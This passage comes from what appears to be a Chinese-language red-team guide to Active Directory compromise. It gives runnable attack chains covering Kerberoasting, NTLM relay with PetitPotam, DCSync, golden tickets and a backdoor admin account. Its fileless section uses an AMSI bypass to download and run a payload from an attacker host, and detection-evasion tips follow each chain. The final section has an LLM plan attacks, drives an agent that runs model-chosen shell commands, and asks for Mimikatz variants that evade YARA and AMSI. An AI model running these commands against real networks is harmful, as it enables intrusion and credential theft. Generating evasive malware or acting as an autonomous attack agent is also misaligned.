$E=@{Name='P';EventName='__InstanceModificationEvent';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}
Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $E
# 触发时执行（ActiveScriptEventConsumer调用powershell）

# === PowerShell 无文件执行（AMSI bypass）===
# 内存反射加载，绕过AMSI
IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
# AMSI bypass patch (内存修补AmsiScanBuffer)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# === .NET Assembly 内存加载（Assembly.Load）===
# 从内存加载EXE/DLL，无文件落盘
$bytes=(New-Object Net.WebClient).DownloadData('http://attacker/SharpHound.exe')
[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,$args))
# 或使用execute-assembly（Cobalt Strike/Havoc）
beacon> execute-assembly /tmp/Rubeus.exe dump

# === COM 对象滥用（横向/持久化）===
# 通过COM劫持实现无文件执行（覆盖HKCU注册表项）
reg add "HKCU\Software\Classes\CLSID\{...}\InprocServer32" /ve /d "C:\evil.dll"

# === DCShadow / DCSync 无文件化 ===
# DCSync：纯网络协议提取，无文件
secretsdump.py domain/admin:pass@DC -just-dc
# DCShadow：临时注册恶意DC推送伪造对象，完成后注销（全程无文件）
mimikatz "!+" "!server" # 注册恶意DC
mimakatz "lsadump::dcshadow /object:... /attribute:... /value:..."
mimikatz "!-"            # 注销，无残留
```

**检测建议**：启用 PowerShell ScriptBlock Logging（4104）+ AMSI；监控 WMI 事件订阅创建（事件 5861）；`.NET Assembly.Load` 通过 ETW `Microsoft-Windows-DotNETRuntime` 监控；DCShadow 检测异常 DC 注册（事件 4662 + 4742）。

### 8.10 2026 网络协议漏洞

协议层漏洞持续涌现：HTTP/3（QUIC）因 UDP + 加密降低可见性引发新攻击；TLS 1.3 降级攻击复活中间人；Kerberos PKINIT 弱化允许证书认证绕过；SMBv3 压缩滥用（SpoolSample 类）；RDP 中间人（CredSSP 绕过）。

```bash
# === HTTP/3 (QUIC) 攻击 ===
# QUIC over UDP + 全加密 → IDS/DLP难以检测
# 攻击：QUIC连接迁移滥用绕过速率限制/指纹
quiche-client --connect https://target:443 --migration
# 服务端QUIC实现漏洞（DoS/内存破坏）
nmap -sU -p 443 --script quic* target

# === TLS 1.3 降级攻击 ===
# 强制协商TLS 1.2 + 弱套件（中间人前提）
mitmproxy --mode transparent --set tls_version_client_min=TLS1.2
# 或利用旧客户端的回退机制
# 检测：观察downgrade_mitm_sentinel告警

# === Kerberos PKINIT 弱化 ===
# PKINIT允许证书换TGT，弱证书校验/ESC8证书可滥用
certipy auth -pfx admin.pfx -dc-ip DC_IP
Rubeus.exe asktgt /user:Administrator /certificate:base64 /ptt
# 弱化：部分实现允许SHA1签名证书 → 降级攻击

# === SMBv3 压缩攻击（SpoolSample类）===
# 触发SMB压缩通道强制认证（PetitPotam替代）
python3 coerce.py -d domain.local -u user -p pass attacker DC

# === RDP 中间人（CredSSP绕过）===
# 利用CredSSP/NLA弱点实施MITM截获凭据
# （需受影响未打KB补丁的客户端）
python3 rdp_mitm.py --target rdp.target --inject
# 或Seth.py拦截RDP降级NLA
seth -i eth0
```

**检测建议**：QUIC 流量解密（部署 QUIC-aware IDS）；TLS 配置禁止降级 + 启用 downgrade protection；PKINIT 强制 SHA256+ 证书与吊销检查；SMB 强制签名 + 禁用压缩；RDP 强制 NLA + CredSSP 补丁到位；监控异常协议协商与降级事件。

---

## PRACTICAL ATTACK CHAINS (2026)

> 本章提供 4 条完整、可直接执行的网络渗透测试实战攻击链。覆盖 BloodHound AD 攻击路径分析、Kerberoasting + AS-REP Roasting 全链、NTLM Relay 到 SMB/LDAP，以及 2026 eBPF Rootkit 检测 + AI 红队自动化。内容用中文编写，代码注释为中文。

### 攻击链 1：BloodHound AD 攻击路径分析

**场景**：攻击者获取了一个普通域用户凭据，通过 BloodHound 图分析发现从当前用户到 Domain Admin 的最短攻击路径，并按路径逐步执行横向移动。

```bash
# ============================================================
# 步骤 1：BloodHound 数据收集
# ============================================================

# 1.1 使用 bloodhound-python 远程收集域数据（Linux 攻击机）
# 需要一个有效域用户凭据
bloodhound-python -d target.local -u username -p 'Password123!' \
  -ns 10.0.0.1 -c All -o bloodhound_data/
# -c All: 收集所有集合（users, groups, computers, sessions, ACLs, GPOs）
# 输出: 多个 .json 文件到 bloodhound_data/ 目录

# 1.2 或使用 SharpHound（Windows / Cobalt Strike beacon 内）
# SharpHound.exe -c All --zipfilename bloodhound.zip
# 或 PowerShell 版本
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\

# 1.3 启动 BloodHound + Neo4j 数据库
neo4j start
bloodhound  # GUI 界面

# 1.4 导入收集的 JSON 数据
# BloodHound GUI → Upload Data → 选择 bloodhound_data/*.json

# ============================================================
# 步骤 2：图分析 — 发现攻击路径
# ============================================================

# 2.1 使用 BloodHound 预置查询
# GUI → Queries → 以下查询按优先级执行:

# 查询 1: "Find All Domain Admins" — 确定最终目标
# 查询 2: "Shortest Paths to Domain Admins from Owned" — 从已控用户到 DA 的最短路径
# 查询 3: "Find Principals with DCSync Rights" — 可执行 DCSync 的用户
# 查询 4: "Kerberoastable Users" — 可 Kerberoast 的 SPN 用户
# 查询 5: "AS-REP Roastable Users" — 未设置预认证的用户

# 2.2 使用 Neo4j Cypher 查询自定义攻击路径
# 通过 Neo4j 浏览器执行 Cypher 查询

# 查询: 从当前用户到 Domain Admin 的最短路径（排除已禁用路径）
cypher-shell -u neo4j -p bloodhound "
MATCH (u:User {name: 'USERNAME@TARGET.LOCAL'}), 
      (da:Group {name: 'DOMAIN ADMINS@TARGET.LOCAL'}),
      p = shortestPath((u)-[*1..15]->(da))
WHERE ALL (r IN relationships(p) WHERE NOT r.isacl = false OR NOT r.method IS NULL)
RETURN p
"

# 查询: 找到所有可被当前用户接管（WriteOwner/WriteDacl/GenericAll）的计算机
cypher-shell -u neo4j -p bloodhound "
MATCH (u:User {name: 'USERNAME@TARGET.LOCAL'}), 
      (c:Computer),
      p = shortestPath((u)-[:GenericAll|WriteDacl|WriteOwner|ForceChangePassword*1..5]->(c))
RETURN c.name, length(p) as hops
ORDER BY hops
"

# 查询: 找到具有 DCSync 权限的非 DA 用户（高价值横向目标）
cypher-shell -u neo4j -p bloodhound "
MATCH (n)-[:GetChangesAll|DCSync*1..3]->(d:Domain)
WHERE NOT n.name CONTAINS 'DOMAIN ADMINS'
RETURN n.name, n.enabled
"

# 2.3 导出攻击路径为 JSON（供后续自动化利用）
cypher-shell -u neo4j -p bloodhound "
MATCH (u:User {name: 'USERNAME@TARGET.LOCAL'}), 
      (da:Group {name: 'DOMAIN ADMINS@TARGET.LOCAL'}),
      p = allShortestPaths((u)-[*1..15]->(da))
RETURN [node in nodes(p) | node.name] as path,
       [rel in relationships(p) | type(rel)] as edges
" --format json > attack_paths.json

# ============================================================
# 步骤 3：按攻击路径逐步执行横向移动
# ============================================================

# 假设 BloodHound 发现的攻击路径:
# username → (ForceChangePassword) → svc_web → (MemberOf) → IT_Admins 
# → (AdminTo) → FILESERVER → (HasSession) → DOMAIN_ADMIN → (MemberOf) → Domain Admins

# 3.1 节点 1→2: ForceChangePassword 重置 svc_web 密码
# BloodHound 显示当前用户对 svc_web 有 ForceChangePassword 权限
net rpc password "svc_web" "NewP@ssw0rd!" -U "target.local/username%Password123!" -S 10.0.0.10
# 或使用 Impacket
python3 setpasswd.py target.local/username:Password123! -newpass 'NewP@ssw0rd!' -dc-ip 10.0.0.1 svc_web

# 3.2 节点 2→3: svc_web 是 IT_Admins 组成员（已通过密码重置获取 svc_web 凭据）
# 验证组成员关系
python3 pth-net.py target.local/svc_web:'NewP@ssw0rd!'@10.0.0.10 -U username -S
# 或使用 netexec
nxc smb 10.0.0.10 -u svc_web -p 'NewP@ssw0rd!' --groups

# 3.3 节点 3→4: IT_Admins 对 FILESERVER 有 AdminTo 权限
# 使用 svc_web（IT_Admins 成员）凭据登录 FILESERVER
python3 wmiexec.py target.local/svc_web:'NewP@ssw0rd!'@10.0.0.20
# 在 FILESERVER 上:

# 3.4 节点 4→5: DOMAIN_ADMIN 在 FILESERVER 上有活跃会话
# 从 FILESERVER 上导出 DOMAIN_ADMIN 的内存凭证
# 使用 Mimikatz 的 sekurlsa::logonpasswords
mimikatz.exe "sekurlsa::logonpasswords" "exit"
# 或使用 lsassy（远程提取）
nxc smb 10.0.0.20 -u svc_web -p 'NewP@ssw0rd!' -M lsassy

# 3.5 节点 5→6: 使用 DOMAIN_ADMIN 的 NTLM Hash 横向移动到域控
# 从 lsassy 输出获取 DOMAIN_ADMIN 的 NTLM Hash
DA_HASH="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
python3 wmiexec.py -hashes :$DA_HASH target.local/DOMAIN_ADMIN@10.0.0.1
# 成功登录域控 → 获得 Domain Admin 权限

# ============================================================
# 步骤 4：域控接管 — DCSync 提取全域哈希
# ============================================================

# 4.1 使用 Domain Admin 凭据执行 DCSync
python3 secretsdump.py target.local/DOMAIN_ADMIN -hashes :$DA_HASH@10.0.0.1
# 输出: 所有用户的 NTLM Hash，包括 krbtgt

# 4.2 提取 krbtgt Hash（用于黄金票据）
KRBTGT_HASH=$(python3 secretsdump.py target.local/DOMAIN_ADMIN -hashes :$DA_HASH@10.0.0.1 | grep krbtgt | awk -F: '{print $NF}')
echo "[+] krbtgt Hash: $KRBTGT_HASH"

# 4.3 获取 Domain SID
DOMAIN_SID=$(python3 lookupsid.py target.local/DOMAIN_ADMIN -hashes :$DA_HASH@10.0.0.1 0 | grep "Domain SID" | awk '{print $NF}')
echo "[+] Domain SID: $DOMAIN_SID"

# ============================================================
# 步骤 5：黄金票据持久化
# ============================================================

# 5.1 伪造黄金票据（使用 krbtgt Hash）
python3 ticketer.py -domain target.local -domain-sid $DOMAIN_SID \
  -nthash $KRBTGT_HASH -extra-sid "${DOMAIN_SID}-512" fakeadmin
# -extra-sid ...-512: 注入 Domain Admins RID

# 5.2 使用黄金票据访问域控
export KRB5CCNAME=fakeadmin.ccache
python3 psexec.py -k -no-pass target.local/fakeadmin@DC01.target.local
# 以 Domain Admin 身份执行命令，无需密码

# 5.3 验证持久化
# 黄金票据有效期默认 10 年（除非 krbtgt 密码被重置两次）
# 即使所有用户密码被重置，黄金票据仍然有效
```

**检测绕过技巧**：
- BloodHound 数据收集使用标准 LDAP 查询，混入正常域管理工具的 LDAP 流量
- `bloodhound-python` 的 LDAP 查询分散在多个请求中，不触发 LDAP 查询速率限制
- ForceChangePassword 操作通过 `net rpc password` 或 SAMR 协议执行，看起来是正常密码重置
- wmiexec 使用 WMI（而非 PsExec 的 ADMIN$ 共享），不创建服务、不写文件，更隐蔽
- lsassy 通过 LSASS 内存读取（而非转储 lsass.dmp），不触发"LSASS 进程访问"告警
- 黄金票据使用 krbtgt Hash 签名，域控无法区分真实 TGT 和伪造 TGT

---

### 攻击链 2：Kerberoasting + AS-REP Roasting 全链

**场景**：攻击者拥有一个普通域用户凭据（无特殊权限）。通过 Kerberoasting 提取服务账户的 TGS 票据，离线破解弱密码，获取高权限服务账户凭据。同时通过 AS-REP Roasting 攻击未设置预认证的用户。

```bash
# ============================================================
# 步骤 1：Kerberoasting — 提取 SPN 用户的 TGS 票据
# ============================================================

# 1.1 使用 Impacket 的 GetUserSPNs.py 提取所有 SPN 用户的 TGS
# 前提: 任意有效域用户凭据（Kerberoasting 不需要特殊权限！）
python3 GetUserSPNs.py target.local/username:'Password123!' -dc-ip 10.0.0.1 -request
# 输出: 所有有 SPN 的用户的 TGS 票据（hashcat 格式）

# 1.2 将输出保存到文件
python3 GetUserSPNs.py target.local/username:'Password123!' -dc-ip 10.0.0.1 -request \
  -outputfile kerberoast_hashes.txt

# 1.3 查看提取到的哈希
cat kerberoast_hashes.txt
# 格式: $krb5tgs$23$*svc_sql$TARGET.LOCAL$svc_sql/mssql.target.local*$HASH...

# 1.4 或使用 Rubeus（Windows / Cobalt Strike 内）
Rubeus.exe kerberoast /outfile:kerberoast.txt /domain:target.local /dc:10.0.0.1
# Rubeus 优势: 支持 AES-256 哈希提取（更难破解但更隐蔽）

# ============================================================
# 步骤 2：离线破解 TGS 票据
# ============================================================

# 2.1 使用 hashcat 破解 RC4-HMAC 哈希（模式 13100）
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force
# 关键参数:
#   -m 13100: Kerberos 5 TGS-REP etype 23 (RC4-HMAC)
#   -r best64.rule: 使用规则变换字典（大小写、数字追加等）

# 2.2 破解 AES-256 哈希（模式 19700，更耗时）
hashcat -m 19700 kerberoast_aes_hashes.txt /usr/share/wordlists/rockyou.txt --force

# 2.3 查看破解结果
hashcat -m 13100 kerberoast_hashes.txt --show
# 输出: $krb5tgs$23$*svc_sql$...:Summer2024!
# → svc_sql 密码为 Summer2024!

# 2.4 使用 john the ripper 作为替代破解工具
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt

# ============================================================
# 步骤 3：使用破解的服务账户凭据横向移动
# ============================================================

# 3.1 验证破解的凭据
nxc smb 10.0.0.0/24 -u svc_sql -p 'Summer2024!' --continue-on-success
# 找到 svc_sql 可登录的主机

# 3.2 检查 svc_sql 是否是本地管理员
nxc smb 10.0.0.20 -u svc_sql -p 'Summer2024!' --local-auth
# 如果 Pwn3d! 标记 → svc_sql 是该主机本地管理员

# 3.3 登录目标主机并提取凭证
python3 wmiexec.py target.local/svc_sql:'Summer2024!'@10.0.0.20
# 在目标主机上执行 Mimikatz 提取内存中的其他用户凭据
mimikatz.exe "sekurlsa::logonpasswords" "exit"

# ============================================================
# 步骤 4：AS-REP Roasting — 攻击未设置预认证的用户
# ============================================================

# 4.1 AS-REP Roasting 不需要任何域凭据！
# 只需知道用户名列表（通过枚举或猜测获取）

# 4.2 使用 Impacket 的 GetNPUsers.py
# 方式 A: 提供用户名列表
python3 GetNPUsers.py target.local/ -usersfile users.txt -dc-ip 10.0.0.1 \
  -format hashcat -outputfile asrep_hashes.txt

# 方式 B: 使用已有域用户凭据枚举（更精确）
python3 GetNPUsers.py target.local/username:'Password123!' -dc-ip 10.0.0.1 \
  -format hashcat -outputfile asrep_hashes.txt

# 4.3 使用 Rubeus（Windows）
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /domain:target.local

# 4.4 离线破解 AS-REP 哈希（模式 18200）
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force

# 4.5 查看破解结果
hashcat -m 18200 asrep_hashes.txt --show
# 输出: $krb5asrep$23$svc_backup@TARGET.LOCAL:...:Password1!
# → svc_backup 密码为 Password1!

# ============================================================
# 步骤 5：组合利用 — 从服务账户到 Domain Admin
# ============================================================

# 5.1 假设 Kerberoasting 破解了 svc_sql 密码
# 5.2 假设 AS-REP Roasting 破解了 svc_backup 密码
# 5.3 使用 BloodHound 分析这两个账户的攻击路径

# 检查 svc_sql 和 svc_backup 是否有通往 Domain Admin 的路径
# 在 BloodHound 中:
# - 右键 svc_sql → "Shortest Paths to Domain Admins"
# - 右键 svc_backup → "Shortest Paths to Domain Admins"

# 5.4 如果 svc_backup 是 Backup Operators 组成员
# Backup Operators 可备份域控的 SAM/SYSTEM 文件 → 提取所有哈希
nxc smb 10.0.0.1 -u svc_backup -p 'Password1!' -M ntdsutil
# 或通过 reg save 导出
python3 secretsdump.py -just-dc target.local/svc_backup:'Password1!'@10.0.0.1

# 5.5 如果 svc_sql 是某台 SQL Server 的 sysadmin
# 通过 SQL Server 执行命令
python3 mssqlclient.py target.local/svc_sql:'Summer2024!'@10.0.0.30 -windows-auth
# 在 SQL Server 中:
enable_xp_cmdshell
xp_cmdshell 'whoami'
xp_cmdshell 'net user backdoor P@ss123 /add && net localgroup administrators backdoor /add'

# 5.6 如果 svc_sql 有 DCSync 权限（通过 BloodHound 确认）
python3 secretsdump.py target.local/svc_sql:'Summer2024!'@10.0.0.1
# 提取所有用户哈希 → 使用 Administrator Hash 登录域控 → Domain Admin
```

**检测绕过技巧**：
- Kerberoasting 的 TGS 请求是 Kerberos 协议的正常操作（任何域用户都可以请求任意 SPN 的 TGS），KDC 不会拒绝
- AS-REP Roasting 的 AS-REQ 请求也是正常 Kerberos 流量，但大量针对不存在用户的请求可能触发账户锁定 — 使用有效用户名列表避免
- hashcat 破解在攻击者本地离线执行，不产生对目标的任何网络流量
- 使用 AES-256 加密的 TGS 票据（Rubeus `/encryption:AES256`）更难被检测，因为大多数监控规则只关注 RC4 票据
- 破解后使用 Pass-the-Hash（而非密码登录）可以避免触发账户登录告警
- 在非工作时间执行 Kerberoasting，因为正常用户也会在工作时间请求 TGS 票据

---

### 攻击链 3：NTLM Relay 到 SMB/LDAP

**场景**：目标域内存在未启用 SMB 签名的主机和 LDAP 签名未强制的域控。攻击者通过 Responder 捕获 NTLM 认证，使用 ntlmrelayx 中继到 SMB 和 LDAP，实现权限提升和域控接管。

```bash
# ============================================================
# 步骤 1：环境准备 — 识别可中继目标
# ============================================================

# 1.1 扫描 SMB 签名状态（未启用签名 = 可中继到 SMB）
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
# 输出中 "signing: False" 的主机可被中继

# 1.2 检查域控 LDAP 签名策略
nxc ldap 10.0.0.1 -u username -p 'Password123!' -M ldap-checking
# 如果 "LDAP Signing: Not Enforced" → 可中继到 LDAP

# 1.3 检查目标是否启用了 EPA（Extended Protection for Authentication）
# EPA 启用时会阻止 NTLM 中继到 HTTP（如 ADCS Web 注册）
# 通过检查 ADCS 是否启用 EPA
nxc ldap 10.0.0.1 -u username -p 'Password123!' -M enum_adcs

# ============================================================
# 步骤 2：捕获 NTLM 认证（Responder + DHCP 投毒）
# ============================================================

# 2.1 启动 Responder 捕获 NTLMv2 哈希（LLMNR/NBT-NS 投毒）
# Responder 监听 LLMNR/NBT-NS 广播请求，当用户访问不存在的共享名时响应
sudo responder -I eth0 -wrfv
# -w: 启用 WPAD 流氓代理
# -r: 启用 NBT-NS 域名后缀响应
# -f: 指纹识别
# -v: 详细输出

# 2.2 触发 NTLM 认证（诱导用户/系统访问不存在的共享）
# 方法 A: 等待自然触发（用户输入错误的共享名）
# 方法 B: 通过钓鱼文档触发（在 Word 宏中引用 \\attacker\share）
# 方法 C: 通过 PetitPotam 强制域控认证
python3 PetitPotam.py -u '' -p '' attacker_ip 10.0.0.1
# PetitPotam 强制域控向攻击者发起 NTLM 认证（EFS 协议滥用）

# 2.3 Responder 捕获到 NTLMv2 哈希
# [SMB] NTLMv2-SSP Client: 10.0.0.1, Domain: TARGET, User: DC01$
# → 域控计算机账户的 NTLM 认证

# ============================================================
# 步骤 3：NTLM Relay 到 SMB（横向移动）
# ============================================================

# 3.1 启动 ntlmrelayx 中继到未启用签名的主机
# 将捕获的 NTLM 认证中继到 SMB 目标
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support
# -tf: 中继目标列表（未启用 SMB 签名的主机）
# -smb2support: 支持 SMB2

# 3.2 当 NTLM 认证被中继到目标主机后，ntlmrelayx 自动:
# - 枚举 SMB 共享
# - 导出 SAM 数据库（本地用户哈希）
# - 如果中继的用户是本地管理员 → 可执行命令

# 3.3 带命令执行的中继（如果中继的用户是目标主机管理员）
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -c "powershell -enc <base64_encoded_command>"
# -c: 在中继成功后执行指定命令

# 3.4 中继到多台主机（并行中继提高成功率）
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -socks
# -socks: 保持 SOCKS 代理，可随时通过代理访问中继的会话
# 通过 proxychains 使用中继的 SMB 会话
proxychains nxc smb 10.0.0.20 -u '' -p '' --shares

# ============================================================
# 步骤 4：NTLM Relay 到 LDAP（权限提升 — RBCD 攻击）
# ============================================================

# 4.1 中继到 LDAP 实现 RBCD（基于资源的约束委派）攻击
# 前提: 中继的认证来自域控计算机账户（通过 PetitPotam 触发）

# 4.2 创建攻击者控制的计算机账户
python3 addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilPass123!' \
  -dc-ip 10.0.0.1 target.local/username:'Password123!'
# 获取 EVIL$ 的 SID
EVIL_SID=$(python3 lookupsid.py target.local/username:'Password123!'@10.0.0.1 1000 | grep EVIL | awk '{print $NF}')

# 4.3 启动 ntlmrelayx 中继到 LDAP
# --delegate-access: 自动配置 RBCD（将 EVIL$ 设为目标的委派主体）
sudo ntlmrelayx.py -t ldap://10.0.0.1 --delegate-access --escalate-user 'EVIL$'
# 当域控的 NTLM 认证被中继到 LDAP 时:
# ntlmrelayx 自动修改域控的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性
# 允许 EVIL$ 代表任意用户访问域控

# 4.4 触发域控认证（PetitPotam）
python3 PetitPotam.py -u '' -p '' attacker_ip 10.0.0.1
# 域控向攻击者发起 NTLM 认证 → 被中继到 LDAP → RBCD 配置完成

# 4.5 使用 RBCD 以 Administrator 身份访问域控
# 请求 EVIL$ 代表 Administrator 的服务票据
python3 getST.py -spn 'cifs/DC01.target.local' -impersonate Administrator \
  'target.local/EVIL$:EvilPass123!' -dc-ip 10.0.0.1

# 4.6 使用伪造的 Administrator 票据访问域控
export KRB5CCNAME=Administrator.ccache
python3 wmiexec.py -k -no-pass target.local/Administrator@DC01.target.local
# 以 Administrator 身份登录域控 → 域控接管

# ============================================================
# 步骤 5：NTLM Relay 到 ADCS（ESC8 — 证书窃取）
# ============================================================

# 5.1 枚举 ADCS 是否启用 Web 注册（HTTP 端点）
nxc ldap 10.0.0.1 -u username -p 'Password123!' -M enum_adcs
# 找到 CA 名称和 Web 注册 URL

# 5.2 中继到 ADCS HTTP 端点（获取域用户证书）
sudo ntlmrelayx.py -t http://10.0.0.5/certsrv/certfnsh.asp -smb2support --adcs
# --adcs: 自动通过 ADCS Web 注册获取证书

# 5.3 触发高权限用户认证（通过钓鱼或 PetitPotam）
# 当高权限用户的 NTLM 认证被中继到 ADCS → 自动获取该用户的证书

# 5.4 使用证书通过 PKINIT 获取 TGT（Pass-the-Cert）
python3 certipy auth -pfx admin.pfx -dc-ip 10.0.0.1 -domain target.local
# 输出: Administrator 的 TGT 和 NTLM Hash

# 5.5 使用 TGT 访问域控
python3 wmiexec.py -k -no-pass target.local/Administrator@DC01.target.local
```

**检测绕过技巧**：
- Responder 的 LLMNR/NBT-NS 投毒是被动等待，不主动发起请求，难以被网络监控发现
- NTLM Relay 使用标准 SMB/LDAP 协议，中继的认证看起来是来自域控的正常请求
- PetitPotam 使用 MS-EFSRPC 协议（EFS 远程调用），不是常规扫描端口，安全设备覆盖较弱
- RBCD 攻击中 LDAP 中继修改的是单个属性（msDS-AllowedToActOnBehalfOfOtherIdentity），LDAP 审计日志中只显示一次属性修改
- ADCS 中继获取证书后使用 PKINIT 认证，不需要密码或 Hash，绕过所有密码相关的检测
- 使用 SOCKS 模式保持中继会话，可随时通过代理复用已中继的认证，减少重复中继的检测风险
- 2026 注意：Microsoft 在 2024-2025 逐步强制 LDAP 签名和 EPA，但大量存量系统仍未配置 → 攻击窗口仍然存在

---

### 攻击链 4：2026 eBPF Rootkit 检测 + AI 红队自动化

**场景**：2026 年攻击者开始使用 eBPF rootkit 实现内核态隐蔽，同时 AI 红队工具实现自动化攻击路径决策。本攻击链演示红队如何利用 AI 自动化 AD 攻击，以及蓝队如何检测 eBPF rootkit。

```bash
# ============================================================
# 步骤 1：AI 红队自动化 — BloodHound + LLM 攻击路径分析
# ============================================================

# 1.1 导出 BloodHound 图数据为 JSON（供 LLM 分析）
cypher-shell -u neo4j -p bloodhound "
MATCH (n)
WITH collect(n) AS nodes
MATCH ()-[r]->()
WITH nodes, collect(r) AS rels
RETURN {
  nodes: [n IN nodes | {id: id(n), label: labels(n)[0], name: n.name, enabled: n.enabled}],
  edges: [r IN rels | {source: id(startNode(r)), target: id(endNode(r)), type: type(r)}]
} AS graph
" --format json > graph_data.json

# 1.2 使用 LLM 分析攻击路径（2026 AI 红队核心能力）
python3 << 'PYEOF'
import json
import openai

# 加载 BloodHound 图数据
with open('graph_data.json') as f:
    graph = json.load(f)

# 构造 LLM 提示词 — 让 AI 分析最优攻击路径
prompt = f"""你是红队自动化决策引擎。基于以下 Active Directory 攻击图数据，输出:

1. 从已控用户 (USERNAME@TARGET.LOCAL) 到 Domain Admin 的 3 条最优攻击路径
2. 每条路径的详细执行步骤（包含具体工具和命令）
3. 每条路径的检测规避评估（哪些步骤可能触发告警，如何规避）
4. 路径优先级排序（按成功率和隐蔽性加权）

攻击图数据:
{json.dumps(graph, indent=2)[:12000]}

已控用户: USERNAME@TARGET.LOCAL
可用凭据: username / Password123!
可用工具: impacket, netexec, mimikatz, bloodhound, responder

输出 JSON 格式:
{{
  "attack_paths": [
    {{
      "name": "路径名称",
      "steps": [
        {{"step": 1, "action": "具体操作", "command": "实际命令", "tool": "工具名", "detection_risk": "Low/Medium/High", "evasion": "规避方法"}}
      ],
      "success_probability": 0.85,
      "stealth_score": 0.7,
      "priority": 1
    }}
  ]
}}
"""

# 调用 LLM（2026 推荐 GPT-4o 或 Claude 3.5 Sonnet）
client = openai.OpenAI()
response = client.chat.completions.create(
    model="gpt-4o",
    messages=[{"role": "user", "content": prompt}],
    temperature=0.2,
    response_format={"type": "json_object"}
)

attack_plan = json.loads(response.choices[0].message.content)

# 保存攻击计划
with open('ai_attack_plan.json', 'w') as f:
    json.dump(attack_plan, f, indent=2, ensure_ascii=False)

# 输出 AI 推荐的最优攻击路径
for path in attack_plan.get('attack_paths', []):
    print(f"\n{'='*60}")
    print(f"路径 {path['priority']}: {path['name']}")
    print(f"成功率: {path['success_probability']} | 隐蔽性: {path['stealth_score']}")
    for step in path['steps']:
        print(f"  步骤 {step['step']}: {step['action']}")
        print(f"  命令: {step['command']}")
        print(f"  检测风险: {step['detection_risk']} → 规避: {step['evasion']}")
PYEOF

# ============================================================
# 步骤 2：AI 自适应横向移动决策
# ============================================================

# 2.1 AI Agent 根据实时凭据状态自动选择下一步操作
python3 << 'PYEOF'
import json
import subprocess
import openai

class AILateralAgent:
    """AI 驱动的自适应横向移动 Agent"""
    
    def __init__(self, initial_creds):
        self.creds = initial_creds  # 已获取的凭据列表
        self.compromised_hosts = []  # 已控主机列表
        self.client = openai.OpenAI()
    
    def analyze_and_act(self):
        """AI 分析当前状态并决定下一步操作"""
        prompt = f"""你是红队横向移动决策引擎。当前状态:

已获取凭据:
{json.dumps(self.creds, indent=2)}

已控主机:
{json.dumps(self.compromised_hosts, indent=2)}

下一步可选操作:
1. nxc smb 扫描新主机（使用已有凭据）
2. lsassy 提取已控主机上的凭据
3. Kerberoasting 提取 SPN 用户 TGS
4. BloodHound 分析新攻击路径
5. ntlmrelayx 中继攻击
6. DCSync 提取全域哈希

请选择最优的下一步操作，输出 JSON:
{{"action": "操作名称", "command": "具体命令", "reason": "选择原因", "expected_result": "预期结果"}}
"""
        response = self.client.chat.completions.create(
            model="gpt-4o",
            messages=[{"role": "user", "content": prompt}],
            temperature=0.3
        )
        
        decision = json.loads(response.choices[0].message.content)
        print(f"[AI 决策] {decision['action']}")
        print(f"[命令] {decision['command']}")
        print(f"[原因] {decision['reason']}")
        
        return decision
    
    def execute_and_learn(self, decision):
        """执行 AI 决策的操作并学习结果"""
        try:
            result = subprocess.run(
                decision['command'], shell=True, capture_output=True, text=True, timeout=300
            )
            output = result.stdout + result.stderr
            
            # 将结果反馈给 AI 进行下一步决策
            # 如果发现新凭据，添加到 creds 列表
            if "hash" in output.lower() or "ntlm" in output.lower():
                self.creds.append({"source": decision['action'], "output": output[:500]})
                print(f"[+] 发现新凭据!")
            
            return output
        except Exception as e:
            print(f"[-] 执行失败: {e}")
            return str(e)

# 初始化 AI Agent
agent = AILateralAgent(initial_creds=[
    {"user": "username", "password": "Password123!", "domain": "target.local"}
])

# AI 自动化横向移动循环（人工确认每一步）
for i in range(10):  # 最多 10 步
    decision = agent.analyze_and_act()
    # 人工确认后执行（安全控制 — AI 决策需人工审核）
    confirm = input(f"\n执行此操作? (y/n): ")
    if confirm.lower() == 'y':
        result = agent.execute_and_learn(decision)
        print(f"\n[执行结果]\n{result[:1000]}")
    else:
        print("[*] 跳过此步骤")
PYEOF

# ============================================================
# 步骤 3：AI 生成 Mimikatz 变体绕过 YARA/AMSI
# ============================================================

# 3.1 使用 LLM 生成语义等价但签名不同的 Mimikatz 变体
python3 << 'PYEOF'
import openai

# 构造提示词 — 生成绕过 YARA 签名的 Mimikatz 变体
prompt = """以下是一段 Mimikatz 的 sekurlsa::logonpasswords 命令的 C 代码片段。
请生成语义等价但绕过 YARA 签名的变体代码:
1. 重命名所有函数和变量（使用无意义名称）
2. 添加不透明谓词（opaque predicates）干扰静态分析
3. 重新排列代码语句顺序
4. 使用等价的 API 调用替换
5. 添加垃圾代码块
6. 字符串加密（运行时解密）

原始代码片段:
```c
void mimikatz_sekurlsa_logonpasswords() {
    PKIWI_BUILTIN_PRIV_LIST privList;
    HANDLE hToken = GetCurrentToken();
    // ... 提取 LSASS 中的凭据 ...
    LsaCallAuthenticationPackage(hToken, ...);
}
```

输出: 修改后的 C 代码，保持功能不变但绕过静态特征检测。
"""

client = openai.OpenAI()
response = client.chat.completions.create(
    model="gpt-4o",
    messages=[{"role": "user", "content": prompt}],
    temperature=0.4
)

mutated_code = response.choices[0].message.content
with open('mimikatz_mutated.c', 'w') as f:
    f.write(mutated_code)
print("[+] Mimikatz 变体代码已生成: mimikatz_mutated.c")
